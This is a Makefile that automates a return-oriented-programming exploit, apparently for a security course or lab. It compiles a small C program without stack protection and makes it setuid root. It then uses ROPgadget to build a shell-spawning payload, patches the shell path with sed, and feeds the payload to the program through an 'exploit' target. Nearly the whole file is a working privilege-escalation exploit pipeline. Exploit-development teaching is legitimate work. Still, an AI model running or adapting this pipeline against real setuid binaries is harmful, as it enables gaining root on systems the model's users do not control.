# vim: noexpandtab tabstop=4 shiftwidth=4

# The program to exploit
SOURCE=log.c
TARGET=log

# Size of the buffer to overflow
BUFFER_SIZE=8

# File names
GADGETS_FILE=gadgets.txt
PAYLOAD_GENERATOR_FILE=generator.py
PAYLOAD_FILE=payload.bin
GDB_SETUP_FILE=gdb-setup
LOG_FILE=exploit


# Used programs
ROPGADGET=./ROPgadget/ROPgadget



# Default rule
compile: $(TARGET)


# Compile the targets one by one
$(TARGET): $(SOURCE)
	gcc -g -static -fno-stack-protector -o $@ $@.c

# Set SETUID bit for root
permissions: $(TARGET)
	chown root $<
	chmod u+s $<


# Find usable gadgets in the binary and check if the '\n' byte is used in the payload
gadgets $(GADGETS_FILE): $(TARGET)
	$(ROPGADGET) -file $(TARGET) -g > $(GADGETS_FILE)
	sed -r 's/\x1B\[[09][1-4]?m//g' -i $(GADGETS_FILE)


# Create payload generator script
_generator $(PAYLOAD_GENERATOR_FILE): $(GADGETS_FILE)
	echo 'from struct import pack' > $(PAYLOAD_GENERATOR_FILE)
	echo 'p = "B" * (512 + 4*3)' >> $(PAYLOAD_GENERATOR_FILE)
	grep "p += " $(GADGETS_FILE) | sed 's/\t*//g' >> $(PAYLOAD_GENERATOR_FILE)
	echo 'p += "\\0"' >> $(PAYLOAD_GENERATOR_FILE)
	echo 'print p' >> $(PAYLOAD_GENERATOR_FILE)

generator: _generator
	sed -i 's:/bin:./xp:' $(PAYLOAD_GENERATOR_FILE)
	sed -i 's://sh:ltsh:' $(PAYLOAD_GENERATOR_FILE)
	$(eval ADDR = $(shell grep -m1 'data' $(PAYLOAD_GENERATOR_FILE) | sed 's/.*\(0x.\{8\}\).*/\1/'))
	sed -i 's:0x42424242:$(ADDR):' $(PAYLOAD_GENERATOR_FILE)


# Generate and print out payload
payload $(PAYLOAD_FILE): generator
	python $(PAYLOAD_GENERATOR_FILE) > $(PAYLOAD_FILE)
	xxd $(PAYLOAD_FILE)


# Perform the exploit
exploit: $(PAYLOAD_FILE)
	./$(TARGET) $(LOG_FILE) < $(PAYLOAD_FILE)


# Spawn a gdb debugger with some pre-configured commands
debug: $(GDB_SETUP_FILE) $(PAYLOAD_FILE)
	gdb -x $(GDB_SETUP_FILE) $(TARGET)


# Clean up
clean:
	rm -f $(TARGET) $(PAYLOAD_GENERATOR_FILE) $(PAYLOAD_FILE) $(GADGETS_FILE)



# Define phony targets
.PHONY: all clean debug exploit gadgets generator payload permissions
